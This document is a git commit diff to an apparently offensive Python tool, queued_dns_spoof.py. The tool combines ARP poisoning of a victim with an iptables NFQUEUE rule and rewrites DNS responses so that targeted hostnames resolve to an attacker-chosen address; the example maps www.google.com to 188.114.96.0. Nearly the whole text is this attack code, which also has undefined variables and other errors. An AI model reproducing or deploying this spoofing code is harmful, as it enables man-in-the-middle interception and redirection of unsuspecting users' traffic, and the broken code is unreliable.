559dbe4f1167f99f4400967b07deb94ff2407d62
WGAVermeer <90707235+WGAVermeer@users.noreply.github.com>
2023-06-11 17:32:22 +0200

    updated

--- queued_dns_spoof.py
+++ queued_dns_spoof.py
@@ -9,23 +9,28 @@ class Dns_spoof:
 
     def __init__(self, queue_num, ipVictim, ipServer, host) -> None:
         self.queue_num = 1
+        self.pktCounter = 0
 
-    def __call__(self, *args: Any, **kwds: Any) -> Any:
-        pass
-
-    def main():
-        pktCounter = 0
+    def __call__(self) -> None:
 
         arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
         arpThread.start()
 
-        queue = NetfilterQueue()
-        queue.bind(queue_num, call_back)
-        queue.run()
+        os.system(
+            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}')
+        self.queue = NetfilterQueue()
+        self.queue.bind(queue_num, call_back)
 
+        try:
+            self.queue.run()
+        except KeyboardInterrupt:
+            os.system(
+                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queue_num}')
+            print("iptables flushed")
+        
     def call_back(bin_packet):
         packet = IP(bin_packet.get_payload())
-        if packet.haslayer(DNSQR):
+        if packet.haslayer(DNSRR):
             try:
                 queryName = packet[DNSQR].qname
                 if queryName in host:
@@ -38,8 +43,8 @@ class Dns_spoof:
                     del packet[UDP].chksum
             except IndexError as error:
                 return False
-            packet.set_payload(bytes(packet))
-        return packet.accept()
+            bin_packet.set_payload(bytes(packet))
+        return bin_packet.accept()
 
 if __name__ == '__main__':
     host = ("www.google.com", "188.114.96.0")
